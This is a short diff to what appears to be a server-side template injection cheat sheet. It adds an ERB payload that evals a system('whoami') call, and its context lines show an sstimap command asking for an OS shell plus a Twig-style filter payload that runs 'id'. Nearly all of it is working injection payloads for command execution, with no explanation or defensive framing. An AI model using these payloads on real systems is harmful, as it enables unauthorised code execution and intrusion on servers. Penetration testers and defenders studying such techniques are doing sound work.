@@ -40,6 +40,12 @@ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
 {{ ['id'] | filter('system') }}
 ```
 
+#### [[ERB]] 
+#ruby
+```ruby
+<%= eval('system("whoami")') %>
+```
+
 #### Jinja
 [[jinja]]
 ```jinja2
